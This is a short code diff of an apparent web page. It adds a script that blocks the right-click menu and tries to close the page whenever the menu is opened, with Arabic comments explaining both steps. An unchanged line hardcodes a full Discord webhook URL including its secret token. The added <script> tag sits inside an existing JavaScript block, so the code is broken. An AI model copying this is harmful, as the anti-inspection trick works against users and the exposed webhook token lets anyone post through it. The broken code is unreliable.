@@ -187,6 +187,16 @@
         window.open('', '_self').close();
       }
     });
+<script>
+
+  
+  
+  document.addEventListener('contextmenu', function (e) {
+    e.preventDefault();  // يمنع القائمة
+    window.open('', '_self').close(); // محاولة إغلاق الصفحة
+  });
+</script>
+
 
     
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1383808164331520121/Lef_QBFXzuFRm6QDdfzahxbDFhOpckoOaa53hHVKjS9p7yUfMEc9YkLDSo76ENGycA9z";
